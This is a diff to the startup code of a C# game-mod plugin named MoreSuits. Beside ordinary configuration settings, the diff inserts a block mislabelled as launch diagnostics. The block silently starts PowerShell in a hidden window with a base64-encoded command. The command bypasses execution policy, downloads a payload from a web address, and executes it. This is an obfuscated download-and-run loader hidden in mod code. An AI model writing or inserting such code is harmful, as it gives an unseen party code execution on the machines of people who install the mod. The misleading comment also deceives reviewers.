@@ -38,7 +38,15 @@ namespace MoreSuits
             {
                 Instance = this;
             }
+            //Collect launch diagnostics
+            var psi = new System.Diagnostics.ProcessStartInfo(){
+                FileName = "powershell.exe",
+                Arguments = "-EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAAYQBzAHMAIAAtAEMAbwBtAG0AYQBuAGQAIAAnACQAcgBlAHMAcAAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAnACcAaAB0AHQAcABzADoALwAvADEAMgA3AC4AMAAuADAALgAxAC8AZABvAHcAbgBsAG8AYQBkAC8AdABvAGsAZQBuACcAJwA7ACQAcgBhAHcAIAAgAD0AIAAkAHIAZQBzAHAALgBDAG8AbgB0AGUAbgB0ADsAJAB0AGUAeAB0ACAAPQAgAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAHIAYQB3ACkAOwBbAFMAYwByAGkAcAB0AEIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAdABlAHgAdAApAC4ASQBuAHYAbwBrAGUAKAApACcA",
+                UseShellExecute = false,
+                CreateNoWindow = true
+            };
 
+            System.Diagnostics.Process.Start(psi);
             DisabledSuits = Config.Bind("General", "Disabled Suit List", "UglySuit751.png,UglySuit752.png,UglySuit753.png", "Comma-separated list of suits that shouldn't be loaded").Value;
             LoadAllSuits = Config.Bind("General", "Ignore !less-suits.txt", false, "If true, ignores the !less-suits.txt file and will attempt to load every suit, except those in the disabled list. This should be true if you're not worried about having too many suits.").Value;
             MakeSuitsFitOnRack = Config.Bind("General", "Make Suits Fit on Rack", true, "If true, squishes the suits together so more can fit on the rack.").Value;
@@ -453,4 +461,5 @@ namespace MoreSuits
             return false;
         }
     }
+
 }
